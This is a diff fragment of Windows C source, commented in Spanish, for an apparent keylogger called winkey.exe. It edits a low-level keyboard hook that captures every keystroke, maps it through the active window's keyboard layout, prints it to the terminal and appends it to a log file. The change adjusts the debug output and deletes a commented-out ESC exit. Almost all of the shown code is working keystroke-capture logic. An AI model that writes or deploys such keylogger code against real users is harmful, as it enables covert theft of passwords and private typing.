@@ -84,25 +84,22 @@ LRESULT CALLBACK LowLevelKeyboardProc(
         // --- INICIO DE LA MODIFICACIÓN ---
         // Obtener el HILO de la ventana activa para saber su distribución de teclado
         DWORD threadId = GetWindowThreadProcessId(currentHnwd, NULL);
-        // Obtener la distribución de teclado (HKL) de ese hilo
+        // Obtener la distribución de teclado (Qwerty, azerty, etc) de ese hilo
         HKL keyboardLayout = GetKeyboardLayout(threadId);
         // --- FIN DE LA MODIFICACIÓN ---
 
         // Funcion para obtener el caracter o nombre de la tecla
         char* keyChar = VirtualKeyToChar(vkCode, p->scanCode, keyboardLayout);
 
-        printf("Tecla: %lu, \tchar: %s\n", vkCode, keyChar);
+        // Ver en terminal las teclas pulsadas ejecutando winkey.exe 
+        //printf("Tecla: %lu, \tchar: %s\n", vkCode, keyChar);
+        printf("vkCode: %lu, scanCode: %lu, char: %s\n", vkCode, p->scanCode, keyChar);
 
         // crear archivo si no existe
         if (logFile) {
             fprintf(logFile, "%s", keyChar);
             fflush(logFile); //Forzar escritura inmediata
         }
-
-        // Si presiona ESC, termina el programa
-        /* if (vkCode == VK_ESCAPE) {
-            PostQuitMessage(0);
-        } */
     }
     return CallNextHookEx(g_hHook, nCode, wParam, lParam);
 }
